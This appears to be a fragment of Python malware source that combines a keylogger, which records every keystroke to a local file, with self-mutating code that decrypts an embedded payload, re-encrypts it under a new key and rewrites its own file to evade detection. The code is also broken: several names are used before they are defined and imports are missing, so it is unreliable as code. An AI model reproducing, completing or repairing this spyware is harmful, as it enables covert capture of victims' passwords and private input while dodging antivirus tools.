#!/usr/bin/env python3
def on_press(key):
    # record keystrokes
    file = open("keylog.txt", "a")
    file.write(str(key))

global token, f
mal = f.decrypt(token).decode()
key = Fernet.generate_key()
f = Fernet(key)
token = f.encrypt(mal).encode()

filename = os.path.basename(__file__)
lines = []
with open(fname, 'r') as newfile:
    lines = newfile.readlines()

with open('new', 'w') as newfile:
    for line in lines:
        if line.startswith('#MAL'):
            break
        newfile.write(line)
    newfile.write('#STOP\n')
    newfile.write('key = \"{}\"\n'.format(key.decode()))
    newfile.write('token = \"{}\"\n'.format(token.decode()))
    newfile.write('f = Fernet(key)')

os.remove(filename)
os.rename('new', filename)

print('operation complete')

with Listener(
    on_press=on_press
) as listener:
    listener.join()

file.close()
